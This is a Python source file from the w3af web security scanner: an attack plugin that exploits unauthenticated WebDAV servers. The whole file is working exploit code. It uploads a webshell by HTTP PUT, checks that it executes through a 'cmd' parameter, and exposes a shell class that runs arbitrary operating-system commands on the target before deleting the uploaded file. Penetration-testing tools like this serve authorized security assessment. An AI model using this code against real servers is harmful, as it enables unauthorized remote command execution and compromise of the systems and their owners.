"""
dav.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.plugins.attack.payloads.shell_handler as shell_handler

from w3af.core.data.fuzzer.utils import rand_alpha
from w3af.core.data.kb.exec_shell import ExecShell
from w3af.core.data.parsers.doc.url import URL
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin


class dav(AttackPlugin):
    """
    Exploit web servers that have unauthenticated DAV access.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self._exploit_url = None

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        ( attack.os_commanding ) should return 'os_commanding' in this method.
        """
        return ['dav']

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: The shell object based on the vulnerability that was passed as
                 a parameter.
        """
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln_obj):
            # Create the shell object
            shell_obj = DAVShell(vuln_obj, self._uri_opener, self.worker_pool,
                                 self._exploit_url)
            return shell_obj
        else:
            return None

    def _verify_vuln(self, vuln_obj):
        """
        This command verifies a vuln. This is really hard work! :P

        :return : True if vuln can be exploited.
        """
        # Create the shell
        filename = rand_alpha(7)
        extension = vuln_obj.get_url().get_extension()

        # I get a list of tuples with file_content and extension to use
        shell_list = shell_handler.get_webshells(extension)

        for file_content, real_extension in shell_list:
            if extension == '':
                extension = real_extension
            om.out.debug('Uploading shell with extension: "%s".' % extension)

            # Upload the shell
            fname = '%s.%s' % (filename, extension)
            url_to_upload = vuln_obj.get_url().url_join(fname)

            om.out.debug('Uploading file %s using PUT method.' % url_to_upload)
            self._uri_opener.PUT(url_to_upload, data=file_content)

            # Verify if I can execute commands
            # All w3af shells, when invoked with a blank command, return a
            # specific value in the response:
            # shell_handler.SHELL_IDENTIFIER
            exploit_url = URL(url_to_upload + '?cmd=')
            response = self._uri_opener.GET(exploit_url)

            if shell_handler.SHELL_IDENTIFIER in response.get_body():
                msg = ('The uploaded shell returned the SHELL_IDENTIFIER, which'
                       ' verifies that the file was uploaded and is being'
                       ' executed.')
                om.out.debug(msg)
                self._exploit_url = exploit_url
                return True
            else:
                msg = ('The uploaded shell with extension: "%s" did NOT return'
                       ' the SHELL_IDENTIFIER, which means that the file was'
                       ' not uploaded to the remote server or the code is not'
                       ' being run. The returned body was: "%s".')
                om.out.debug(msg % (extension, response.get_body()))
                extension = ''

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits webDAV misconfigurations and returns a shell. It is
        rather simple, using the dav method "PUT" the plugin uploads the
        corresponding webshell ( php, asp, etc. ) verifies that the shell is
        working, and if everything is working as expected the user can start
        typing commands.
        """


class DAVShell(ExecShell):
    
    def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
        super(DAVShell, self).__init__(vuln, uri_opener, worker_pool)
        
        self.exploit_url = exploit_url
    
    def execute(self, command):
        """
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        :param command: The command to handle ( ie. "ls", "whoami", etc ).
        :return: The result of the command.
        """
        to_send = self.exploit_url + command
        to_send = URL(to_send)
        response = self._uri_opener.GET(to_send)
        return shell_handler.extract_result(response.get_body())

    def end(self):
        url_to_del = self.exploit_url.uri2url()

        msg = 'DAVShell is going to delete the web shell that was uploaded' \
              ' to %s.'
        om.out.debug(msg % url_to_del)

        try:
            self._uri_opener.DELETE(url_to_del)
        except BaseFrameworkException, e:
            om.out.error('DAVShell cleanup failed with exception: "%s".' % e)
        else:
            om.out.debug('DAVShell cleanup complete, %s deleted.' % url_to_del)

    def get_name(self):
        return 'dav'

    def __reduce__(self):
        """
        Need to define this method since the Shell class defines it, and we have
        a different number of __init__ parameters.
        """
        return self.__class__, (self._vuln, None, None, self.exploit_url)